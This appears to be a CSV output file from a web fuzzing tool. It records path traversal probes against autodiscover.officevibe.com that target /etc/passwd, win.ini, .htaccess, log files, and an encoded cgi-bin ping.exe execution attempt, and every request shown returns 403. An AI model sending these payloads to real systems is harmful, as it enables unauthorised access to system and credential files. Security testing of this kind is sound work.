FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
static/../../../../windows/win.ini.,http://autodiscover.officevibe.com/static/../../../../windows/win.ini.,,88730,403,312,17,7,text/html; charset=us-ascii,7.129091ms,
..//..///etc/passwd,http://autodiscover.officevibe.com/..//..///etc/passwd,,89982,403,312,17,7,text/html; charset=us-ascii,7.213373ms,
..\..\..\..\..\..\temp\temp.class,http://autodiscover.officevibe.com/..\..\..\..\..\..\temp\temp.class,,91616,403,312,17,7,text/html; charset=us-ascii,8.348997ms,
../manager/text,http://autodiscover.officevibe.com/../manager/text,,91797,403,312,17,7,text/html; charset=us-ascii,7.512208ms,
..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/..%5c..%5cetc/passwd,,93430,403,312,17,7,text/html; charset=us-ascii,7.086516ms,
../../../../apache/logs/error.log,http://autodiscover.officevibe.com/../../../../apache/logs/error.log,,93634,403,312,17,7,text/html; charset=us-ascii,7.814506ms,
..////etc/passwd,http://autodiscover.officevibe.com/..////etc/passwd,,94975,403,312,17,7,text/html; charset=us-ascii,6.958865ms,
../../../../../../../../../../WINNT/system32/ipconfig.exe,http://autodiscover.officevibe.com/../../../../../../../../../../WINNT/system32/ipconfig.exe,,95676,403,312,17,7,text/html; charset=us-ascii,7.468025ms,
.//..///etc/passwd,http://autodiscover.officevibe.com/.//..///etc/passwd,,96809,403,312,17,7,text/html; charset=us-ascii,7.186548ms,
../../../.htaccess,http://autodiscover.officevibe.com/../../../.htaccess,,98837,403,312,17,7,text/html; charset=us-ascii,12.869597ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,http://autodiscover.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,,99167,403,312,17,7,text/html; charset=us-ascii,8.686752ms,
